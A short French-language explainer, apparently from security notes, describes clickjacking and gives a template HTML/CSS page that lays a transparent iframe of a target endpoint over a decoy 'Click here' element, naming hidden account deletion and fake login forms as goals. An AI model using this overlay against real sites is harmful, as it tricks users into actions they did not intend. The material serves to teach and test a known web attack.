Le clickjacking est une technique qui consiste a modifier la structure d'une page web ou a créer une page web malveillante en utilisant les `iframes` .

Cela peut être une requête `POST` vers un endpoint de suppression de compte caché derrière un bouton, ou encore un formulaire de connexion dissimulé sous un vrai.

Pour le clickjacking, on peut reproduire une page en utilisant la structure suivante:
```html
<style>  
iframe { position:relative; 
         width:$width_value; 
	     height: $height_value; 
	     opacity: $opacity; 
	     z-index: 2; } 

div { position:absolute; 
      top:$top_value; 
      left:$side_value; 
      z-index: 1; } 

</style> 

<div>Click here</div> 

<iframe src="http://example.com/endpoint"></iframe>
```
